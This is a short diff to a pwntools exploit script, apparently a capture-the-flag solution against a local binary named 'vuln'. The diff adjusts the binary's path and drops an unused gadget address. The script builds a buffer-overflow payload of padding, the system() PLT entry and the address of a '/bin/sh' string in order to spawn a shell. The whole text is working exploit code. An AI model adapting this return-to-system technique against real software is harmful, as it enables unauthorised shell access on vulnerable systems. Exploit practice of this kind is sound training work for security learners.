@@ -1,14 +1,12 @@
 from pwn import *
 
-context.binary = exe = ELF("vuln")
+context.binary = exe = ELF("../vuln")
 
 context.log_level = "debug"
 
 sys_plt = exe.plt.system
 
 bin_ad = next(exe.search(b'/bin/sh\x00'))
-
-ret = 0x8049214
 
 payload = flat(
     'A' * 22,
@@ -17,7 +15,7 @@ payload = flat(
     bin_ad
 )
 
-args = ['./vuln']
+args = ['../vuln']
 
 io = process(args)
 
